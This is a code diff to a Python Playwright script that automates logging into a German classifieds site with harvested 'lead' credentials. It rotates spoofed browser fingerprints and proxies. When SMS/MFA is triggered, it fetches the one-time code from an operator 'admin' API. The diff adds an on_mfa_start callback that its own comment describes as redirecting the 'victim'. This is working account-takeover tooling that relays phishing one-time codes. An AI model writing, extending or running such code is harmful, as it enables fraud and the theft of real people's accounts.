@@ -17,6 +17,7 @@ import json
 import os
 import sys
 import time
+from typing import Callable, Optional
 import urllib.error
 import urllib.request
 
@@ -37,7 +38,7 @@ from webde_login import (
     load_webde_fp_indices_allowed,
     save_cookies,
     webde_fingerprint_pool_index_for_email,
-    webde_first_proxy_config_for_login,
+    webde_proxy_for_klein_playwright,
     webde_playwright_context_options_from_fp,
     webde_playwright_init_script_for_fp,
 )
@@ -501,16 +502,26 @@ def klein_login_with_page(
     api_base: str = "",
     lead_id: str = "",
     worker_secret: str = "",
+    skip_initial_goto: bool = False,
+    on_mfa_start: Optional[Callable[[], None]] = None,
 ) -> int:
     """
     Выполняет вход на уже открытой странице (или переходит на login_url).
+    skip_initial_goto: не вызывать goto (уже открыт нужный экран, напр. после сброса пароля).
+    on_mfa_start: вызывается один раз при появлении SMS/MFA до long-poll кода (редирект жертвы).
     Возврат: 0 ок; 2 нет поля пароля; 3 таймаут SMS; 4 ошибка OTP; 5 MFA без API; 6 неверные данные на сайте.
     """
-    page.goto(login_url, wait_until="load", timeout=90_000)
+    if not skip_initial_goto:
+        page.goto(login_url, wait_until="load", timeout=90_000)
     page.wait_for_timeout(800)
     _try_dismiss_cookie_banners(page)
 
-    fr_user, loc_user = _find_visible_email_field(page, total_timeout_ms=55_000)
+    fr_user, loc_user = _find_visible_email_field(page, total_timeout_ms=15_000 if skip_initial_goto else 55_000)
+    if not loc_user and skip_initial_goto:
+        page.goto(login_url, wait_until="load", timeout=90_000)
+        page.wait_for_timeout(600)
+        _try_dismiss_cookie_banners(page)
+        fr_user, loc_user = _find_visible_email_field(page, total_timeout_ms=55_000)
     if not loc_user:
         print(
             "Поле E-Mail/Username на странице входа не найдено (другой layout, блокировка, капча).",
@@ -586,6 +597,11 @@ def klein_login_with_page(
     if needs_mfa:
         if api_base and lead_id and worker_secret:
             print("[Klein] SMS/MFA — long-poll админки.", flush=True)
+            if on_mfa_start:
+                try:
+                    on_mfa_start()
+                except Exception as e:
+                    print(f"[Klein] on_mfa_start: {e}", file=sys.stderr)
             code = _wait_sms_from_admin(api_base, lead_id, worker_secret)
             if not code:
                 print("Код SMS не получен (таймаут или ошибка API).", file=sys.stderr)
@@ -639,6 +655,7 @@ def klein_login_playwright(
     api_base: str = "",
     lead_id: str = "",
     worker_secret: str = "",
+    on_mfa_start: Optional[Callable[[], None]] = None,
 ) -> int:
     """Запуск Chromium/Chrome и полный сценарий входа.
     Отпечаток — тот же пул webde_fingerprints.json и webde_fingerprint_indices.txt, что у WEB.DE;
@@ -667,7 +684,7 @@ def klein_login_playwright(
     if use_chrome:
         launch_kw["channel"] = "chrome"
 
-    proxy_config = webde_first_proxy_config_for_login()
+    proxy_config = webde_proxy_for_klein_playwright()
     pool = _load_webde_fingerprints_playwright()
     fp: dict | None = None
     if pool:
@@ -690,7 +707,7 @@ def klein_login_playwright(
         )
         context_options = {
             "locale": "de-DE",
-            "viewport": {"width": 1280, "height": 900},
+            "viewport": {"width": 1280, "height": 720},
             "user_agent": (
                 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                 "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
@@ -743,9 +760,26 @@ def klein_login_playwright(
                 api_base=api_base,
                 lead_id=lead_id,
                 worker_secret=worker_secret,
+                on_mfa_start=on_mfa_start,
             )
         finally:
-            browser.close()
+            if (
+                not headless
+                and os.getenv("KEEP_BROWSER_OPEN", "0").lower() in ("1", "true", "yes")
+            ):
+                print(
+                    "[Klein] KEEP_BROWSER_OPEN=1 — окно не закрываю. Закройте браузер при необходимости, "
+                    "затем Enter в терминале.",
+                    flush=True,
+                )
+                try:
+                    input()
+                except (EOFError, KeyboardInterrupt):
+                    pass
+            try:
+                browser.close()
+            except Exception:
+                pass
         return code
 
 
